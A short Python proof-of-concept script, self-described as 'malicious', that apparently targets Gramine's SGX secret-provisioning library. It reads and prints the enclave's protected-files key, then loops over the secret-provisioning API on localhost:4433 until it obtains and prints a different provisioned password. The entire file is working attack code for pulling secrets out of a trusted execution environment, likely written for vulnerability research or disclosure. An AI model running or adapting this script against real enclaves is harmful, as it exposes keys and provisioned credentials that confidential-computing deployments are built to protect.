#!/usr/bin/env python3

import ctypes
import time
print("Hello from malicious world")

f = open("/dev/attestation/protected_files_key", "r")
base_pwd = f.read()

print("Password read received from PRELOAD lib: <{}>".format(base_pwd), flush=True)

lib = ctypes.cdll.LoadLibrary("/gramine/meson_build_output/lib/x86_64-linux-gnu/libsecret_prov_attest.so")

while True:
    ctx = ctypes.c_void_p(0)
    ret = lib.secret_provision_start(ctypes.c_char_p(b"localhost:4433"), ctypes.c_char_p(b"/poc/tls/tls-ca.pem"), ctypes.byref(ctx))
    if ret < 0:
        time.sleep(5)
        continue

    mem = ctypes.POINTER(ctypes.c_ubyte)()
    size = ctypes.c_int()

    ret = lib.secret_provision_get(ctx, ctypes.byref(mem), ctypes.byref(size))
    if ret < 0:
        time.sleep(5)
        continue
    pwd = ""

    for i in range(size.value):
        pwd += "{:02x}".format(mem[i])

    if pwd != base_pwd:
        print ("Mischief managed: password received: {}".format(pwd), flush=True)
        break

    time.sleep(5)